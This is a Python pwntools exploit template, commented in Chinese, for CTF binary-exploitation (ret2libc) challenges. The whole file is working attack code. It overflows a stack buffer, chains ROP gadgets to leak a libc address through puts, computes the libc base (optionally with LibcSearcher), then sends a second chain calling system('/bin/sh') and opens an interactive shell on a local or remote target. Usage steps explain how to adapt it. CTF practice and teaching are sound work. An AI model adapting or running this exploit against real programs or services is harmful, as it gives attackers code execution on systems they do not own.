# -*- coding: utf-8 -*-
"""ret2libc 通用 Exploit 模板(pwntools)(补充题型: Pwn)

题型特征:
    64/32 位 ELF, 有 system 或可用 libc, 找不到 /bin/sh 后门, 需要先泄露 libc 地址再打。

用法:
    1. pip install pwntools
    2. 按题目改三个标记处: OFFSET / gadget / libc 版本偏移
    3. python ret2libc_exp.py          # 本地 ./pwn 调试
       python ret2libc_exp.py REMOTE   # 连远程
依赖:
    pip install pwntools
    pip install LibcSearcher          # 无已知 libc 时自动搜版本
"""
from pwn import *

context.arch = 'amd64'          # x86 就改成 'i386'
context.log_level = 'info'

LOCAL_BIN = './pwn'             # ← 改成本地 ELF
LIBC = './libc.so.6'            # ← 题目给了 libc 就填, 没给置 None 用 LibcSearcher

OFFSET = 0x78 + 8               # ← 改成实际溢出偏移(cyclic -r 可测)
REMOTE = ('node.example.com', 12345)  # ← 改成远程地址


def start():
    if args.LOCAL or not args.REMOTE:
        return process(LOCAL_BIN)
    return remote(*REMOTE)


def main():
    elf = ELF(LOCAL_BIN, checksec=False)
    io = start()

    # ---------- 第一段: 泄露 puts@got, 回到 main 再来一次 ----------
    pop_rdi = 0x401234            # ← ROPgadget --binary pwn | grep "pop rdi"
    ret_gadget = pop_rdi + 1      # 栈对齐用的 ret, 64 位常见需要

    payload = flat(
        b'A' * OFFSET,
        pop_rdi, elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main'],
    )
    io.sendlineafter(b'input:', payload)          # ← 改成实际提示串
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    log.success(f'puts@libc = {leak:#x}')

    # ---------- 第二段: 计算 libc base, 打 system("/bin/sh") ----------
    if LIBC:
        libc = ELF(LIBC, checksec=False)
        libc.address = leak - libc.sym['puts']
    else:
        from LibcSearcher import LibcSearcher
        searcher = LibcSearcher('puts', leak & 0xFFF)
        libc_base = leak - searcher.dump('puts')
        log.success(f'libc base = {libc_base:#x}')
        # 用 libc_base + 已知偏移继续; 演示里直接 return 占位
        system = libc_base + 0x052FD0             # ← 换成 LibcSearcher dump 的偏移
        binsh = libc_base + 0x18CD57              # ← 同上: strings -tx libc | grep /bin/sh
        payload2 = flat(
            b'A' * OFFSET,
            ret_gadget,
            pop_rdi, binsh,
            system,
        )
        io.sendlineafter(b'input:', payload2)
        io.interactive()
        return

    system = libc.sym['system']
    binsh = next(libc.search(b'/bin/sh\x00'))
    log.success(f'system = {system:#x}  /bin/sh = {binsh:#x}')

    payload2 = flat(
        b'A' * OFFSET,
        ret_gadget,
        pop_rdi, binsh,
        system,
    )
    io.sendlineafter(b'input:', payload2)
    io.interactive()


if __name__ == '__main__':
    main()
